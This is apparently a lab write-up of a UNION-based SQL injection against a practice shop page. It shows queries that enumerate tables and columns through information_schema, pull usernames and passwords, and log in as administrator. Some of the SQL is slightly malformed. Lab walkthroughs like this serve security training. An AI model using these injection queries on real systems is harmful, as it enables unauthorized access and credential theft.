This is the vulnerable webpage to perform SQL Injection attack,for listing the contents.

![image](https://user-images.githubusercontent.com/65653010/235273956-763e3da6-02a6-4368-8b8c-0fadc700f41b.png)

We perform a query to verify both the columns have text content in them

SELECT * FROM someTable WHERE category=Gifts UNION SELECT 'abc' 'def'

![image](https://user-images.githubusercontent.com/65653010/235274029-5fcc6f6d-3fe0-4875-962b-5359eb4c6736.png)

The query is confirmed. Now we perform a next query to get the information of a users table

SELECT * FROM someTable WHERE category=Gifts UNION SELECT table_name NULL FROM information_schema.tables

![image](https://user-images.githubusercontent.com/65653010/235329446-8ef32a9d-3b66-4af9-9d5b-4007788624a3.png)

Now we extract columns which contain username and password using query

SELECT * FROM someTable WHERE category=Gifts UNION SELECT column_name NULL FROM information_schema.columns WHERE table_name=''

By this query we retrieve the username and passwords

![image](https://user-images.githubusercontent.com/65653010/235329544-150919b5-ead3-4b45-8d74-f01666fd00e9.png)

![image](https://user-images.githubusercontent.com/65653010/235329554-3ab0db6f-45b0-40a5-8aa5-d4d779fbc258.png)

After we derive the columns of username and password, we perform this query to get the password ofg administrator


SELECT * FROM someTable WHERE category=Gifts UNION SELECT (username column) (password column) FROM (users table)

![image](https://user-images.githubusercontent.com/65653010/235329735-c744da42-7b41-4f80-8d63-95d5fb9c0c7c.png)

Now after we get the username and password of administrator we login into it

![image](https://user-images.githubusercontent.com/65653010/235329762-8e5cd54a-5277-4971-9d71-455ebe2644ba.png)


